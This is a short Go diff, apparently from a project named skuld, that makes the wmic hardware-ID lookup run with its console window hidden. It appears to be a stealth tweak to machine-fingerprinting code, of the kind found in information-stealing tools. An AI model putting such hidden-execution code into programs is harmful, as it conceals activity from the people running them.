@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"syscall"
 
 	"github.com/hackirby/skuld/utils/program"
 	"github.com/shirou/gopsutil/v3/disk"
@@ -15,6 +16,8 @@ import (
 
 func GetHWID() (string, error) {
 	cmd := exec.Command("wmic", "csproduct", "get", "UUID")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
 	out, err := cmd.Output()
 	if err != nil {
 		return "", err
